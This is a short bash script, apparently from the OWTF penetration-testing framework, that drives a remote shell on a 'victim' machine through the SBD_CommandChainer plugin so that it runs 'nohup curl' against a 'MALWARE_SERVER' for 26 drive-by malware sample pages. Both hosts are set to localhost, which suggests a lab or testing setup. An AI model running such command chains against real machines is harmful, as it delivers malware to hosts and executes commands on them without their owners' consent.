#!/usr/bin/env bash

echo "Is this running on the victim?: root@victim:~/sbd_agent# ./shelld.sh shelld.cfg"
echo "Without the OWTF agent running on the victim machine this won't work. Continue? [y/n]"
read c
if [ "$c" != "y" ]; then
        exit
fi

VICTIM=127.0.0.1
MALWARE_SERVER=127.0.0.1
/root/owtf/owtf.py -f -o SBD_CommandChainer RHOST=$VICTIM RSHELL_EXIT_METHOD=wait RSHELL_COMMANDS_BEFORE_EXIT="sleep 5#killall curl" COMMAND_PREFIX="nohup curl http://$MALWARE_SERVER/DriveBy/malware-samples/test_00" COMMAND_SUFIX=".html &" TEST=01,02,03,04,05,06,07,08,09,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26

echo "Review the log now? [y/n]"
read c
if [ "$c" == "y" ]; then
        tail -32 owtf_review/db/command_register.txt | more
fi